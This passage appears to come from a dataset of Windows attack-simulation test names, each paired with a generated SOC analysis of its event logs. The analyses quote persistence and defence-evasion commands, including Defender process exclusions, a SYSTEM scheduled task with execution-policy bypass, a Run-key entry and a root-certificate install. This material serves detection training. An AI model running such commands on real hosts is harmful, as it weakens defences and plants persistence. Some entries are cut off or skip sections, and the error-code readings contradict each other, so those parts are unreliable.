1. **Repeated Logon Activity with SYSTEM Account**: While these actions typically represent normal system functions due to their SYSTEM-level logons, vigilance is necessary because such activities can mask malicious intentions under SYSTEM guise. 
2. **Credential Access Attempts**: While pertaining to legitimate access methods within a controlled domain, repeated unsuccessful attempts could suggest configuration issues or a non-threatening misconfiguration.
3. **Command Execution**: The `cmd.exe` commands for copying and compiling JavaScript (`LibHello.js`) could be part of regular operations if developing or maintaining software. If these actions are unexpected, they might warrant further exploration to rule out suspicious or unauthorized activity.

### Resolution:

Based on the analysis of the provided log entries and the context they suggest, the situation is assessed to be:

**Resolution: SUSPICIOUS** 

- While there's no direct evidence of compromise or clear malicious activity, some actions (like the `cmd.exe` operation) warrant further investigation to confirm their legitimacy in the environment.
  
### Guidance:

- **Verify the Legitimacy of Suspicious Commands**: Confirm with responsible teams/departments whether the `LibHello.js` operation is routine or if it indicates unauthorized activity.
- **Monitor Logon Activities**: Continue to monitor logon activities involving high-privilege accounts, especially if SYSTEM-level access is achieved outside expected scenarios.
- **Assess Credential Access Failures**: Investigate repeated credential access failures for potential configuration issues or automation script errors.

Taking these steps will ensure that any potentially harmful intent or misconfiguration is swiftly identified and resolved."
Windows Auto Update Option to Notify before download,"### Detailed Analysis of Logs

#### Overview

Upon reviewing the provided Windows event logs, several pieces of information stand out that indicate potential suspicious activities related to user activity and system configuration.

#### Indicators of Suspicious Activity

1. **Time Manipulation Events (Event ID 4616 & Kernel-General 1):**
   - The system time was changed by the service `svchost.exe`. This is atypical under normal circumstances unless it's part of a legitimate update or timezone adjustment. Frequent or unexplained system time changes can be indicative of an attempt to alter logs or evade detection.

2. **Elevated Privileges (Event ID 4672):**
   - The user `admin_test` obtained several privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeBackupPrivilege`, and more, which are often targeted for privilege escalation attacks. While this could be normal for an administrative account, it becomes suspicious without further context or verification.

3. **Command Execution for Registry Manipulation (Sysmon Event ID 1):**
   - The process `cmd.exe` executed a command to modify Windows Update settings in the registry using the `reg` command. This action was performed by the user `SERVER002\\admin_test` and involves altering system configuration, which can be indicative of a potential policy bypass or persistent behavior modification.

4. **Frequent Use of System Utilities:**
   - Several system utilities such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` were executed frequently within a short time window. While these might be part of normal administrative activities, the context of their frequent invocation in sequence is unusual and can indicate reconnaissance or preparation steps in an attack.

5. **Microsoft Edge Update Activities:**
   - Extensive creation and modification of processes related to `Microsoft Edge Update` executable files are seen in the Sysmon logs. Though updating applications is normal, the volume and frequency here are worth noting and could indicate misuse if not verified as scheduled and legitimate actions.

#### Assessment of Situation

Given the combination of time changes, privilege escalation, registry modifications, and the use of multiple system utilities in a short span of time, these logs suggest potential suspicious activity. This could range from an attempted system compromise to misused administrative actions.

### Resolution

**Resolution: SUSPICIOUS**

The activities observed do not provide irrefutable evidence of compromise but exhibit enough concerning patterns to warrant further investigation. It is recommended that the following steps are taken:

1. **Verify the legitimacy of the `admin_test` activities**, and ensure all actions are accounted for by policy-allowed tasks.
2. **Check for scheduled tasks or updates**, especially those related to privileges and registry changes to ensure they are legitimate.
3. **Perform endpoint scans** for known vulnerabilities and malware indicators related to the observed activities.
4. **Monitor network logs** for unusual traffic or connections initiated by this host to external IPs, as potential indicators of data exfiltration or remote command execution.

Failure to address these concerns could expose the system to risks of unauthorized access, data breaches, or system integrity compromise."
Tamper with Windows Defender Evade Scanning -Process,"Upon reviewing the provided log entries across various categories, the following points have been noticed:

1. **System Logs:**
   - Windows Update and Time Service entries appear routine and do not indicate any signs of malicious activity. The system is receiving updates for Windows Defender Antivirus which is standard behavior for system maintenance and security.

2. **Sysmon Logs:**
   - Multiple processes related to Windows system utilities (e.g., `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) and Microsoft Edge Update are seen executing. There is a noticeable occurrence of `powershell.exe` being used to execute a command to exclude `outlook.exe` from Windows Defender using the `Add-MpPreference -ExclusionProcess`. This could be considered suspicious since excluding processes from Defender usually requires administrative privileges and might be employed to bypass security mechanisms.
   - The PowerShell command seems to be executed from a high-integrity level, which suggests administrative rights were used, and this action should be verified against known administrative actions or purpose for exclusions.
   - Additionally, the EdgeUpdate entries suggest normal update behavior, as these utilities are designed to manage updates for Microsoft Edge.

3. **Application Logs:**
   - Services related to Edge Update are seen starting and stopping, which is consistent with update operations. There are no logs directly indicating the start of unknown services or applications, which is a positive indicator.

4. **Windows PowerShell Logs:**
   - Similar to Sysmon logs, the PowerShell script executed seems geared towards altering Windows Defender preferences. Without legitimate business need, this could be a step in a more sophisticated attack to ensure certain processes are not scanned.
  
5. **Security Logs:**
   - No security logs were provided, so potential indicators of compromised user accounts or escalations in privilege cannot be cross-verified in this particular dataset.

### Conclusion:
**Resolution: SUSPICIOUS**

The logs, particularly involving PowerShell commands to modify Windows Defender exceptions, stand out due to their potential implications for system integrity and security. While there are no explicit signatures of malware or a breach, the action of excluding `outlook.exe` from scanning is unusual without a clear operational need. This activity needs further investigation to ensure it is executed with intent aligned to operational security policies. Additional facts can be gathered by interviewing the system administrators or reviewing system documentation that might explain the need for such PowerShell scripts. Also, conducting a threat hunt for known IOCs (Indicators of Compromise) or recently observed threats related to such activities may be advisable.

Furthermore, it's recommended to check user privilege levels, audit recent changes through the security logs (if available), and validate the necessity of exclusions set in Windows Defender."
Indirect Command Execution - Scriptrunner.exe,"Upon reviewing the logs provided, the following points summarize the investigation findings:

### Suspicious/Anomalous Behavior:
1. **Multiple Executions of Critical System Tools (wevtutil, conhost):**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\\admin_test`. Although these are legitimate Windows processes, frequent or unexpected execution might suggest log clearing or manipulation attempts.

2. **PowerShell Execution with ScriptRunner:**
   - PowerShell was executed with a command intended to run `calc.exe` through `Scriptrunner.exe`. Such executions can indicate script-based attacks or automation that isn't well-documented or expected, especially with `calc.exe` often used as a benign test target in exploitation scripts.

3. **Time Synchronization Events:**
   - The system event logs indicate time adjustments and synchronization attempts via `svchost.exe`, which may be routine or indicative of adversary activity trying to cover tracks or synchronize operations across systems.

### Potential Malicious Activity:
- **Nested PowerShell Script Execution:**
  - The use of PowerShell with external script execution can be methodologically suspicious if it is not expected administrative behavior, pointing towards possible script injection or testing.
  
### Threats or Risks Identified:
- **Potential Log Tampering:**
  - Frequent execution of `wevtutil.exe` suggests possible attempts to clear or alter event logs.
- **Suspicious Script Execution:**
  - PowerShell script execution potentially points to unauthorized or malicious scripts running which might alter system behavior, install malware, or perform unauthorized tasks. 

### Assessment and Guidance:
Given the patterned use of administrative tools and scripting for potential unauthorized purposes, there is a need to further verify the intent and legitimacy of these processes. Actions to consider:

- Cross-verify server maintenance logs to ascertain whether these excecutions were sanctioned processes.
- Review the administrative access logs for the user `admin_test` to validate the authenticity and context of actions performed.
- Implement tighter monitoring of PowerShell and system commands, including command-line auditing and PowerShell execution policy settings.
- Engage threat detection tools to flag similar behavioral patterns in real-time and notify administrative teams.

### Final Resolution:
- **SUSPICIOUS** - The observed activity, while not overtly malicious, shows patterns that necessitate a more detailed investigation to ensure the security of the host and its continued operations without compromise."
Creating W32Time similar named service using schtasks,"Upon reviewing the provided Windows event logs, we can draw the following observations and analysis:

### Analysis:

1. **Process Execution and Command-Line Arguments:**
   - There are several executions of legitimate system binaries like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `schtasks.exe`, and `cmd.exe`. These are typical system binaries but are often abused by attackers in Living-off-the-Land (LotL) techniques.
   - Of particular concern is the execution of a scheduled task via `schtasks` (Event ID: 17949). The command line:
     ```
     ""cmd.exe"" /c schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\\data.004_NonExistingScript.ps1"" /tn win32times /f & schtasks /query /tn win32times
     ```
     shows an attempt to schedule a daily task that runs a PowerShell script (`data.004_NonExistingScript.ps1`) with execution policy bypassed. The use of `-ep bypass` should be investigated as it can indicate an attempt to evade script execution restrictions.
   - The script path `c:\\data.004_NonExistingScript.ps1` does not seem to exist or was intended to be obfuscated. This behavior suggests potential tampering or a misconfiguration.

2. **User Context:**
   - All processes of concern were executed in the context of the user `SERVER002\admin_test` with high integrity. This indicates the tasks were executed with elevated privileges, which is concerning if originating from unauthorized activity.

3. **Parent Process:**
   - The parent process for several executed commands is `wsmprovhost.exe`, which is indicative of Windows Remote Management (WinRM) activity. While not inherently malicious, unexpected remote management sessions could warrant more investigation into access patterns.

4. **Windows Defender Update:**
   - The System logs indicate Windows Defender antivirus received a security update, which is normal behavior. There is no overt indication this activity is malicious.

5. **Credential Security Audit:**
   - Security event logs show several 5379 events (Credential Read operations) with a failed return code (3221226021), indicating errors or possibly failed attempts at credential access. However, further context is required to assess if these were malicious attempts.

### Assessment and Guidance:

- **SUSPICIOUS Activity Detected:**
  - The scheduling of a task using `schtasks` with the flagged command-line argument suggests potential compromise or misconfiguration and warrants further investigation. 
  - The elevated privileges demonstrated across most processes indicate those responsible had high enough permissions to perform system-level tasks.
  - There should be a thorough review of remote management or admin actions taken to rule out unauthorized access.

**Recommendations:**
- Confirm the existence and content of the PowerShell script `c:\\data.004_NonExistingScript.ps1`. If it's malicious, there might be an attempted persistence mechanism.
- Investigate the `admin_test` account activity and verify recent logon sessions, especially focusing on remote connections.
- Review security policies around PowerShell script execution and scheduled tasks.
- Consider threat hunting activities to identify whether other systems exhibit similar patterns.

Finalize findings as **SUSPICIOUS**, requiring more in-depth analysis to determine the intent and scope of the observed activities."
Abusing MyComputer Disk Fragmentation Path for Persistence,"Upon reviewing the provided Windows event logs collected from the Sysmon, System, Application, and Security channels, here is the detailed analysis focused on identifying any suspicious or malicious activity:

### Analysis of Sysmon Logs:

1. **Process Executions:**
   - **Frequent Execution of System Utilities**: There are multiple executions of common Windows utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`. These utilities are often benign if run as part of standard administrative tasks. However, frequent and unexpected execution can be indicative of an attacker investigating the system.
   - **Use of `cmd.exe` to Modify the Registry**: The logs show the execution of `cmd.exe` with a command line that modifies the registry (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath`) to point to `notepad.exe`. Registry modifications, especially those made to system paths, can be a part of malicious persistence tactics.
   - **Sysmon EventID 1 (Process Creation)**: The presence of `whoami.exe` and its spawn of `conhost.exe` may suggest attempts to gather local user information. This can be normal if done for legitimate scripting tasks, but repeated execution can be suspicious.

2. **Use of Parent Processes**: The parent process for some of these executables is `wsmprovhost.exe`, indicating potential remote management activity. This could be legitimate but warrants a careful review, especially if unexpected.

### Analysis of System and Security Logs:

- **Time Changes Detected**: The logs capture several instances where the system time was changed, possibly adjusted by the `svchost.exe` process. This may suggest an admin adjusting time settings or could possibly hide activity time stamps in logs.
- **Security Event 4616**: Multiple logs indicate the system time change, which coincides with `svchost.exe`. This may also relate to time synchronization tasks but should be reviewed in the context of other suspicious activities.

### Analysis of Application Logs:

- **Edge Update Logs**: Various Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) are running as expected. There is no unusual behavior noted with these specific updates in these logs apart from their regular updates under NT AUTHORITY\SYSTEM.

### Assessment and Conclusion:

**Resolution: SUSPICIOUS**

The logs point towards activities that deserve further investigation:
- The use of command-line tools to modify registry settings can be indicative of attempts to maintain persistence or prepare for further attacks.
- System time manipulations might be covering tracks, though currently, there is no direct evidence linking them to illicit behavior.

### Recommended Actions:
1. **Review User Activity**: Assess and verify the recent actions of the user account `SERVER002\admin_test` and correlate these activities with their expected tasks. Look for any discrepancies or unauthorized actions.
2. **Inspect Network Activity**: Examine any remote connections and determine if unauthorized remote shells have been established.
3. **Conduct Threat Hunting**: Deploy threat hunting techniques to check for additional signs of compromise on Server002 and network-wide that could correlate with this observed behavior.
4. **Analyze Historical Logs**: Review logs over a more extended period to see if this pattern of behavior is persistent or anomalous.

Given these points, although there's no direct evidence confirming malicious actions, the unusual system behavior necessitates a deeper dive to either confirm or rule out potential threats."
Execute base64-encoded PowerShell,"## Analysis of Windows Event Logs

Upon reviewing the provided logs, here are the notable points and detailed analysis of potentially suspicious activities:

### 1. Sysmon Events

- **Process Creation and Activity:**

  - **Wevtutil.exe**: Frequent execution of `wevtutil.exe` by `SERVER002\admin_test`. Wevtutil is a legitimate Windows utility used for reading event logs, which can be used for both administrative and malicious purposes (e.g., clearing event logs to cover tracks).

  - **Conhost.exe**: Consistently appears shortly after `wevtutil.exe`. `conhost.exe` is the Console Window Host, used to run console applications. Its presence here seems normal given the environment.

  - **Edge Update**: Multiple executions related to Microsoft Edge updates, such as `MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe`, appear routine, consistent with Chrome-based Edge update behavior.

  - **Powershell Encoded Commands**: Event IDs 17955 and 17958 indicate encoded PowerShell commands. Encoded commands are often used to obfuscate intent but can be leveraged for benign purposes as well. A review of the command reveals it to be benign (simple output).

### 2. Security Events

- **Event ID 4672**: Indicates that an account was assigned special privileges—specifically the SYSTEM account. SYSTEM privileges are standard for essential Windows services; however, monitoring is encouraged to ensure misuse does not occur.

- **Repeated Credential Access Attempts**: Event ID 5379 showing failed access attempts for `MicrosoftAccount:user=02txoixylodcstop`. Continuous credential access attempts with `ReturnCode=3221226021` (STATUS_NO_SUCH_USER) suggest attempts to access a non-existent or incorrect Microsoft account, possibly due to misconfiguration.

### 3. Windows PowerShell Logs

- **PowerShell Activity**: Reflects legitimate command execution outputs. There is a use of the `Write-Host` PowerShell command with base64 encoded content, which upon decoding does not reveal any malicious activity.

### 4. General Observations

No direct indications of malware or unauthorized access were detected within the scope of these logs. However, there are activities that warrant closer examination:
- **Frequent Use of Wevtutil**: Frequent access of event logs under an `admin_test` user account suggests possible review or alteration of event logs. It is often used legitimately but may also be a sign of log manipulation for purpose of covering tracks.
- **Permission Use**: High privilege operations should be regularly reviewed to ensure no unauthorized privilege escalation is taking place.

### Recommended Actions

- **Further Investigation**: 
  - Review `admin_test` activities and audit logs to verify permissions and intentions behind frequent event utility usage.
  - Check configurations for systems attempting to use `MicrosoftAccount:user=02txoixylodcstop` to prevent further unnecessary authentication attempts.

- **Monitoring and Mitigation**: 
  - Continue monitoring event logs for activities tied to PowerShell and administrative tools like `wevtutil.exe` for signs of misuse.
  - Implement restrictions or alerts for unexpected use of high privilege accounts and applications.

### Conclusion
**Resolution**: **SUSPICIOUS**

The activities observed could align with legitimate enterprise behaviors but include elements commonly used in malicious scenarios (e.g., use of `wevtutil.exe`, encoded PowerShell commands). Additional logs and context around `admin_test` account behavior and the persistent access attempts are required for a conclusive assessment. Please continue tracking the mentioned activities closely, and corroborate with additional data if available."
User scope COR_PROFILER,"Based on the analysis of the provided Windows event logs, here is a detailed assessment of the situation:

    - **Environment Variables Set**: `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH` variables are configured, all pointing to the same registry key and DLL.
    - **Execution of Event Viewer**: The script attempts to execute `eventvwr.msc` using `mmc.exe`. This is a common technique used in User Account Control (UAC) bypass methods by some malware.

#### Sysmon Log
- **Process Creation**: Sysmon logs reveal multiple processes initiated by the `PowerShell.exe` user `SERVER002\admin_test`.
    - **Process Activities**: There are processes involving `mmc.exe`, which is launched by PowerShell, and conhost instances. This aligns with the execution sequence from the PowerShell log, indicative of potential script-driven automation.
    - **High Integrity Level**: Processes like `HOSTNAME.EXE`, `whoami.exe`, `mmc.exe`, and PowerShell instances are running at a high integrity level under the same `admin_test` context, which indicates they have higher privileges.

### Conclusion

#### Indicators of Suspicion
- **DLL in Temp Directory**: Loading DLLs from temporary file paths is a typical red flag indicating potentially malicious behavior, as legitimate software usually places DLLs in specific directories.
- **Modification of Registry Keys**: Creating and modifying registry keys programmatically to enable .NET profiling for a custom profiler is suspicious, as it can allow malicious code to inject or tamper with running processes.
- **Unusual Processes and Execution**: The use of PowerShell to initiate administrative actions through oblique methods (such as eventvwr.msc) suggests potential UAC bypass attempts, which are a hallmark of certain types of malware operations.

### Resolution
Based on the above points, the activity present in the logs is **SUSPICIOUS**. 

### Guidance for Action
1. **Isolation**: Immediately isolate the server `Server002` from the network to prevent further potential spread or communication outbound.
2. **Forensic Analysis**: Perform an in-depth forensic review on `Server002`. Pay attention to the `ADMIN_~1` user's activities and investigate the DLL (`data.012x64.dll`) and associated file path for malicious code.
3. **Registry Analysis**: Carefully examine the registry for any unauthorized or unusual modifications, especially related to .NET profilers.
4. **Review User Context**: Ensure the `admin_test` user is verified and analyze all actions performed under this user account to rule out any unauthorized access.
5. **Network Monitoring**: Enhance network monitoring for signs of data exfiltration or communication with known malicious domains.

The situation requires proactive remediation steps and possible engagement with incident response teams to mitigate any identified threats."

Install root CA on Windows,"Upon reviewing the provided Windows event logs, several details indicate potentially suspicious activity, though not definitively malicious activity. Here are the key points of interest:

### Security Log Analysis:
1. **Event ID 4624 and 4672:**
   - The logon type 5 indicates a service logon, which is typically expected for SYSTEM account activities.
   - Privileges such as `SeDebugPrivilege` and `SeTcbPrivilege` were assigned to the SYSTEM account, which are high-level privileges often flagged for scrutiny.
   - These events are routine for SYSTEM operations but can be exploited if misused.

2. **Event ID 5379:**
   - There were several credential API operations with `ReturnCode` 3221226021, which indicates an access denied error. This could suggest unsuccessful credential accesses, but the TARGET string with ""WindowsLive"" suggests it might relate to Windows service account operations that failed to authenticate.

### Sysmon Log Analysis:
1. **Execution of PowerShell (Event ID 1):**
   - Multiple instances of PowerShell are logged, including one with a complex command line for importing and moving certificates. This command:
     ```powershell
     ""powershell.exe"" & { $cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My, Move-Item -Path $cert.PSPath -Destination \""Cert:\LocalMachine\Root\"" }
     ```
   - The use of PowerShell for handling certificates indicates administrative tasks. While it might be benign, PowerShell is frequently leveraged in attacks to perform malicious activities such as persistence or lateral movement.

2. **Instances of Wevtutil and Conhost.exe:**
   - Wevtutil is often used for managing event logs and can be seen in benign administrative scenarios. Its frequent occurrences could imply attempts to clear logs or modify them.
   - Conhost.exe usage is typically benign but monitoring its parent process can provide context on any potential misuse.

### PowerShell Logs:
- The PowerShell execution traces show complex operations involving certificates, as noted in Sysmon logs. The Engine state transitions from `Available` to `Stopped` suggest commands were run to completion or were terminated correctly.

### Application and System Logs:
- The entries primarily include typical Windows process starts and updates by Microsoft services, which seem consistent with system updates or scheduled tasks. These logs do not exhibit excessive or unusual behavior aside from issues already noted in credential accesses.

### Conclusion:
Based on the processes and commands in these logs, the overall activities are consistent with administrative tasks. However, the use of PowerShell for certificate manipulation, high-privilege assignments, and credential access attempts warrant further scrutiny due to their potential to be leveraged in malicious campaigns.

   - Analyze any persistent processes or network connections initiated by the suspicious process for further signs of malicious activity.

3. **Review Security Controls:**
   - Ensure that PowerShell logging is enabled to provide greater transparency of script execution.
   - Implement strict user access controls and auditing, especially around the execution of PowerShell scripts.
   - Evaluate existing security policies and enhance endpoint protection measures.

These actions will help secure the environment, eliminate the immediate threat, and bolster future defenses against similar attacks or misconfigurations."
Execution of non-dll using rundll32.exe,"Upon analyzing the logs across various channels, here's a breakdown of findings with indicators of suspicious activity:

### Detailed Analysis

**1. System and Security Logs:**
- **Time Manipulation:** All logs show an alteration in the system time. Events with EventID 4616 in the Security log recorded the change of system time. Similarly, Kernel-General logs (EventID 1 and 24) also reflect these changes. System time alterations can be legitimate but could also be indicative of malicious attempts, e.g., to bypass time-based security mechanisms or logs manipulation. The `svchost.exe` process, which is system-critical and often targeted for malicious use, was responsible for this change.

**2. Application Logs:**
- **Edge Update:** The Application log indicates frequent stopping of the ""edgeupdate"" service. Though this in itself is not explicitly malicious, frequent service start-stop patterns can warrant further monitoring.

**3. Windows PowerShell Logs:**
- **Suspicious PowerShell Execution:** Multiple logs indicate the execution of PowerShell with the command `rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW`. This is suspicious because:
  - `rundll32.exe` is used harmlessly to execute DLL files, but when misused can run potentially unwanted scripts or payloads.
  - Executing a `.png` file through `rundll32.exe` seems anomalous as these are image formats and not typically executable.

**4. Sysmon Logs:**
- **Process Anomalies:** The execution of `rundll32.exe` with the command mentioned above, as well as concurrent `cmd.exe` executions, signifies a potential scripting or payload activity under the user `SERVER002\admin_test`.
- **Privilege Escalation:** There was an instance where the Security log recorded privileges typically associated with administrative accounts (EventID 4672). This might indicate privilege escalation.

### Assessment and Resolution

Based on the suspicious use of `rundll32.exe` with peculiar file paths, combined with the time manipulation and frequent process executions logged by Sysmon with the same patterns, this scenario must be treated with caution.

- **Threat/Risk Level:** There's clear evidence of potentially malicious activity that warrants an immediate and detailed investigation to verify if a compromise occurred and to understand the impact.
  
- **Guidance for Progress:**
  - **Isolate the Machine:** Immediately isolate Server002 to prevent potential lateral movement within the network.
  - **Root Cause Analysis:** Conduct a detailed analysis of the triggering event that initiated this PowerShell script.
  - **Forensic Analysis:** Fetch endpoint telemetry, process tree data, registry changes, and network connections for deeper forensic analysis.
  - **Review Access Rights:** Check all users and services’ permissions associated with the event logs, ensuring least privilege is enforced.
  - **Update Security Controls:** Ensure all software and definitions related to security are up-to-date, especially PowerShell and system-level autocorrect and logging settings.

**Final Resolution: SUSPICIOUS**

The events in the logs strongly suggest that anomalous activity is present and requires further detailed investigation to determine the intent and scope of any malicious actions."
Activate Windows NoDesktop Group Policy Feature,"### Analysis of the Logs:

Upon reviewing the provided logs from the Application, System, Sysmon, and Security channels, the following points stand out:

#### 1. **Application Log Analysis:**

- **EventID 15, Provider: SecurityCenter** indicates Windows Defender is active. This is a standard log entry and does not suggest any malicious activity.
- **Multiple EventIDs from 'edgeupdate' services** indicate the stop/start of the service. Edge update-related log entries are typically benign, as they represent software updating operations unless coupled with unexpected behavior elsewhere.

#### 2. **System Log Analysis:**

- **EventID 19 from Windows Update Client:** Logs a successful update of the Microsoft Defender Antivirus. This is normal system behavior.
- **Time Change Events (EventID 1 and 24 from Kernel-General):** These indicate adjustments in system time. While not unusual in itself, frequent or unexplained changes might merit further investigation to rule out time-tampering by malicious software.

#### 3. **Sysmon Log Analysis:**

- **Frequent execution of 'wevtutil.exe', 'conhost.exe', 'cmd.exe', and registry modifications.** on the same 'SERVER002\admin_test' user. This could represent normal administrative behavior, especially on a server, but the use of command-line tools and registry changes should be monitored for unusual patterns.
- **Execution of 'cmd.exe' with registry modification command:**
  - The command `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoDesktop /t REG_DWORD /d 1 /f` appears to disable desktop icons, which could indicate an attempt to modify user settings stealthily. This is suspicious if unexplained by IT activity.

- **Activity for Microsoft Edge Updates:** Microsoft's edge updates appearing repeatedly is typically benign except if accompanied by other suspicious indicators like unexpected network connections, which are not observed here.

#### 4. **Security Log Analysis:**

- **EventID 4616 indicates a change in system time:** Time changes can be legitimate or a potential indicator of time manipulation by malware. The involvement of `svchost.exe` is typical, but consistent changes merit validation against expected administrative actions.

### Conclusion:

- The logs reveal multiple instances of what appear to be administrative actions, including command-line executions and registry modifications that could be normal in a system administration context. However, **the registry modification by 'cmd.exe'** seems atypical without further context or authorization, especially concerning user settings like desktop visibility.
- Given this, the activities are flagged as **SUSPICIOUS**. 

### Recommendations:

- Conduct an interview with the user ""admin_test"" and the respective IT staff to confirm any legitimate reasons for these activities.
- Review Change Management records to ensure these actions align with authorized IT maintenance tasks.
- If these actions were unauthorized, consider reviewing endpoint protection alerts, further triaging logs for broader context, and possibly conducting a forensic review of the affected system.
- Implement auditing for registry changes to keep track of similar future activities immediately.

### Final Resolution:
- **SUSPICIOUS** - The logs contain activities that need additional investigation, especially concerning unauthorized registry changes."
Windows Modify Show Compress Color And Info Tip Registry,"Upon reviewing the provided logs, here is a detailed analysis:

### Analysis of Logs

1. **PowerShell Log:**
   - No entries present for analysis.

2. **Application Log:**
   - **edgeupdate Service Stopped:** 
     - The repeated entries indicating the stopping of the `edgeupdate` service are benign and possibly part of regular maintenance or update processes.
   - **Microsoft-Windows-Security-SPP:**
     - Indicates standard activity related to the Software Protection Platform Service without any red flags for malicious activity.

3. **System Log:**
   - **Microsoft-Windows-Time-Service:**
     - Shows synchronization with time.windows.com, which is expected behavior for all systems using the default time sync configuration.

4. **Sysmon Log:**
   - Predominantly shows executions of processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`, and Microsoft Edge update-related executables.
   - **Unusual Registry Modifications:**
     - A `cmd.exe` process is executing commands to modify the Windows Explorer’s registry settings (`ShowInfoTip`, `ShowCompColor`) which can be considered suspicious as these are less commonly altered settings that could be misused for hiding files or adjusting user interface details. This activity originates from a high-integrity session under `admin_test` user context, suggesting either administrative task automation or potentially unauthorized or misused administrative actions.
   - **Microsoft Edge Update Activity:**
     - Extensive Edge update-related processes were observed, showing a chain of update operations performed by `MicrosoftEdgeUpdate.exe` and helper executables. These appear regularly as part of the Edge browser update mechanism unless further indicators of tampering are present.

5. **Security Log:**
   - No entries present for analysis.

### Indicators of Interest
- **Registry Modifications via cmd.exe:**
  - The execution of registry modifications through command-line may warrant further analysis to ensure these changes are authorized and understood, especially given their execution in a high-integrity session.

### Assessment of Situation
- The logs predominantly reflect standard system update and maintenance activities, with the exception of some registry modifications that could warrant further attention, especially if unexpected or unexplained by standard operating procedures.

### Resolution
- **Resolution:** **SUSPICIOUS**
  - While the majority of activity is benign and typical for system updates, the unexpected registry modifications warrant further investigation to rule out potential misuse or unauthorized changes.

### Guidance on How to Proceed
1. **Verify the Source of Registry Modifications:**
   - Confirm whether the registry entries modified via `cmd.exe` were part of an authorized script or task. Collaborate with system administrators or users associated with the `admin_test` account for validation.
   
2. **Review User Activity:**
   - Conduct a review of recent activity and login events associated with the `admin_test` user to ensure legitimacy and authorization.

3. **Monitor Future Logs:**
   - Enable heightened logging and monitoring for any further unauthorized attempts to modify critical system settings or execute similar registry changes.

By following these steps, any potential risks can be mitigated, and system integrity can be maintained."
Modify Registry of Local Machine - cmd,"After thoroughly analyzing the provided event logs from the Sysmon, System, Application, Security logs, and the absence of PowerShell logs, I have identified the following patterns and suspicious activities:

1. **Unusual Process Execution via Cmd and Registry Modification:**
   - There is an instance where `cmd.exe` is executed with a command-line argument that adds a registry key to run `calc.exe` at startup:
     ```
     CommandLine: ""cmd.exe"" /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
     ```
   - This command is executed by the user `SERVER002\admin_test` with high integrity level (potentially elevated privileges).

2. **Concerning Process and Command Execution Pattern:**
   - The use of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and potentially benign system utilities in a clustered and automated manner, most likely scripted, is peculiar, especially with no clear associated administrative tasks.

3. **Microsoft Edge Update Processes:**
   - A series of updates and execution of `MicrosoftEdgeUpdate.exe` and its components appear legitimate; however, they seem to be occurring with a frequency that could warrant further verification if external threats are being masked through browser update mechanisms. Given the benign nature of Microsoft updates, these could be routine.

4. **Time Tampering Evidence:**
   - The System log and Security log both show events related to time changes by the `svchost.exe` process:
     - Time was changed from `2024-10-24 14:18:29.2983564` to `2024-10-24 14:18:49.8077344`.
   - Although time changes can occur due to normal operations or configuration issues, they could be indicative of manipulation attempts to obfuscate activity timestamps.

5. **Absence of PowerShell Activity:**
   - The PowerShell logs being empty or absent is neither concerning nor benign without additional context. 

Based on the analysis, the logs demonstrate indicators that could suggest malicious intent due to the registry modification using CMD to ensure persistence. However, Microsoft Edge updates exhibit common characteristics unless utilized as a vector for deploying unauthorized updates, which isn't conclusively supported within this dataset alone.

**Resolution: SUSPICIOUS**

### Guidance:
- Further investigate the context and legitimacy of the `cmd.exe` command that modifies the startup registry key and validate the authenticity of the user's actions (SERVER002\admin_test).
- Review system changes and application behavior around the timeframe of time modifications to rule out potential tampering.
- Verify whether the wevtutil and parallel system process executions align with any known administrative procedures or scripts.
- Confirm that all Microsoft Edge Update processes are genuine via review of file digital signatures and contacting Microsoft if needed.
- Consider implementing enhanced monitoring around persistence mechanisms and privilege use on SERVER002."
Indirect Command Execution - pcalua.exe,"Upon reviewing the provided logs, I conducted a detailed analysis focusing on potential indicators of suspicious or malicious activity. Here's a summary of the findings:

### Analysis

1. **System Log**
   - The log contains a routine time synchronization event with `time.windows.com`. This is standard behavior and typical for Windows hosts to maintain accurate system time. No anomalies or indicators of compromise were observed here.

2. **Windows PowerShell Log**
   - No entries were provided for the PowerShell log, which means there were no observable anomalies or potential misuse logged during this timeframe.

3. **Security Log**
   - No entries were provided for the Security log, indicating no recorded security-related actions during this period captured in the Security log.

4. **Sysmon Log**
   - Multiple executions of system utilities like `hostname.exe`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`, `cmd.exe`, `pcalua.exe`, and `calc.exe`. These utilities are standard Windows tools, and their invocation does not inherently suggest malicious activity.
   - The execution of `cmd.exe` with the command-line `pcalua.exe -a calc.exe & pcalua.exe -a C:\Windows\System32\calc.exe` stands out as a little unconventional given that it uses the Program Compatibility Assistant to launch the calculator. However, this alone is not definitive evidence of malicious activity and could be related to troubleshooting or a script running a series of diagnostic tests.

5. **Application Log**
   - A record of the Software Protection Platform Service running rules in `RulesEngine`. This is typical for ensuring software license integrity. No suspicious or malicious activity was detected in this log entry.

### Summary

**Context and Pattern Evaluation:**
- The Sysmon log shows sequential invocations of several standard system programs, which, if correlated with legitimate user activity like IT administrative tasks or troubleshooting, would be considered benign.
- The lack of PowerShell and Security log entries might warrant checking configuration or proper auditing scope.

**Potential Investigative Lead:**
- The unconventional use of `pcalua.exe` via `cmd.exe` to launch applications could benefit from understanding the context. Investigate why and who initiated such command execution, especially around the time suspicious behavior is suspected.

### Final Assessment

